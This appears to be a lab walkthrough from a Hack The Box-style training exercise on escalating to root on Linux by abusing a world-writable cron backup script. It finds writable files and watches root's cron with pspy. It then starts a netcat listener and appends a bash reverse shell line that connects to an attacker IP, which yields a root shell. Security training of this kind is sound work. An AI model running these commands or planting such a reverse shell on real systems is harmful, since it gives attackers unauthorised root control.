# Cron Job Abuse

## Finding Writable Files

```sh
htb-student@NIX02:~$ find / -path /proc -prune -o -type f -perm /0002 2> /dev/null
```

```output title="Output" hl_lines="2"
/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.access
/home/backupsvc/backup.sh
```

## World Writable

```sh
htb-student@NIX02:~$ ls -l /dmz-backups/backup.sh | head
```

```output title="Output" hl_lines="2"
total 1190476
-rwxrwxrwx 1 root root      189 Nov  6  2020 backup.sh
-rw-r--r-- 1 root root 12967830 May 16 20:20 www-backup-2025516-20:20:01.tgz
-rw-r--r-- 1 root root 12967830 May 16 20:22 www-backup-2025516-20:22:01.tgz
-rw-r--r-- 1 root root 12967830 May 16 20:24 www-backup-2025516-20:24:01.tgz
-rw-r--r-- 1 root root 12967830 May 16 20:26 www-backup-2025516-20:26:01.tgz
-rw-r--r-- 1 root root 12967830 May 16 20:28 www-backup-2025516-20:28:01.tgz
-rw-r--r-- 1 root root 12967830 May 16 20:30 www-backup-2025516-20:30:01.tgz
-rw-r--r-- 1 root root 12967830 May 16 20:32 www-backup-2025516-20:32:01.tgz
-rw-r--r-- 1 root root 12967830 May 16 20:34 www-backup-2025516-20:34:01.tgz
```

## Monitoring

```sh
htb-student@NIX02:~ ./pspy64 --interval 1000 --fsevents --procevents
```

```output title="Output" hl_lines="6 15"
2025/05/16 20:42:01 CMD: UID=0    PID=2564   | /usr/sbin/CRON -f
2025/05/16 20:42:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2025/05/16 20:42:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2025/05/16 20:42:01 FS:                 OPEN | /usr/share/zoneinfo/Arctic/Longyearbyen
2025/05/16 20:42:01 FS:               ACCESS | /usr/share/zoneinfo/Arctic/Longyearbyen
2025/05/16 20:42:01 CMD: UID=0    PID=2568   | /bin/bash /dmz-backups/backup.sh
2025/05/16 20:42:01 FS:               ACCESS | /usr/share/zoneinfo/Arctic/Longyearbyen
2025/05/16 20:42:01 FS:        CLOSE_NOWRITE | /usr/share/zoneinfo/Arctic/Longyearbyen
2025/05/16 20:42:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2025/05/16 20:42:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2025/05/16 20:42:01 FS:                 OPEN | /usr/share/zoneinfo/Arctic/Longyearbyen
2025/05/16 20:42:01 FS:               ACCESS | /usr/share/zoneinfo/Arctic/Longyearbyen
2025/05/16 20:42:01 FS:        CLOSE_NOWRITE | /usr/share/zoneinfo/Arctic/Longyearbyen
2025/05/16 20:42:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2025/05/16 20:42:01 CMD: UID=0    PID=2569   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-2025516-20:42:01.tgz /var/www/html
2025/05/16 20:42:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2025/05/16 20:42:01 CMD: UID=0    PID=2571   | gzip
2025/05/16 20:42:01 CMD: UID=0    PID=2570   | /bin/sh -c gzip
2025/05/16 20:42:02 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2025/05/16 20:42:02 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2025/05/16 20:42:02 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
```

## Netcat

```sh
my@attack:~$ nc -lvnp 9001
```

## Appending Reverse Shell Code

```sh
htb-student@NIX02:~$ echo '/bin/bash -i >& /dev/tcp/10.10.14.235/9001 0>&1' >> /dmz-backups/backup.sh
```

## Session Established

```sh
root@NIX02:~# id
```

```output title="Output"
uid=0(root) gid=0(root) groups=0(root)
```
